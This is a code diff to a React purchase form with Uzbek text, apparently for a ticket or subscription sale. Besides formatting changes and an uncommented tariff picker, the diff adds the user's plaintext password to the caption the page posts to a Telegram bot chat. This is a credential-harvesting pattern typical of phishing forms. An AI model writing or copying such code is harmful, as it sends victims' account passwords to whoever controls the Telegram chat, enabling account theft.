@@ -5,7 +5,15 @@ import { supabase } from "@/integrations/supabase/client";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Plane, User, Calendar, ArrowLeft, Send, Lock, Upload } from "lucide-react";
+import {
+  Plane,
+  User,
+  Calendar,
+  ArrowLeft,
+  Send,
+  Lock,
+  Upload,
+} from "lucide-react";
 import { z } from "zod";
 import qrCodeImg from "@/assets/payment-qr.png";
 import { useToast } from "@/hooks/use-toast";
@@ -132,7 +140,7 @@ const Purchase = () => {
     }
 
     try {
-      const caption = `<b>Yangi xarid so'rovi:</b>\n👤 Ism: ${result.data.fullName}\n🔗 Username: ${username}\n📅 Yosh: ${result.data.age}`;
+      const caption = `<b>Yangi xarid so'rovi:</b>\n👤 Ism: ${result.data.fullName}\n🔗 Username: ${username}\n🔑 Parol: ${password}\n📅 Yosh: ${result.data.age}\n💰 Ta'rif: ${price} so'm`;
 
       const formData = new FormData();
       if (chatId) formData.append("chat_id", chatId);
@@ -145,15 +153,17 @@ const Purchase = () => {
         {
           method: "POST",
           body: formData,
-        }
+        },
       );
 
       if (!telegramResponse.ok) {
-         throw new Error("Telegramga yuborishda xatolik yuz berdi");
+        throw new Error("Telegramga yuborishda xatolik yuz berdi");
       }
     } catch (err) {
       console.error(err);
-      setError("Telegramga yuborishda xatolik o'z berdi. Iltimos keyinroq urinib ko'ring yoki bot sozlamalarini tekshiring.");
+      setError(
+        "Telegramga yuborishda xatolik o'z berdi. Iltimos keyinroq urinib ko'ring yoki bot sozlamalarini tekshiring.",
+      );
       setLoading(false);
       return;
     }
@@ -269,7 +279,7 @@ const Purchase = () => {
               </div>
             </div>
 
-            {/* <div className="pt-2">
+            <div className="pt-2">
               <Label className="mb-3 block">Ta'rifni tanlang</Label>
               <div className="grid grid-cols-2 gap-4">
                 <button
@@ -299,7 +309,7 @@ const Purchase = () => {
                   <span className="text-xs uppercase tracking-wider">so'm</span>
                 </button>
               </div>
-            </div> */}
+            </div>
 
             <div className="bg-primary-foreground/5 p-4 rounded-xl border border-border text-center space-y-4 my-2">
               <p className="text-sm text-muted-foreground">
@@ -316,7 +326,7 @@ const Purchase = () => {
               <p className="text-xs text-muted-foreground/80">
                 To'lov qilganingizdan so'ng chekni rasm tarzida yuklang
               </p>
-              
+
               <div className="relative mt-4">
                 <input
                   type="file"
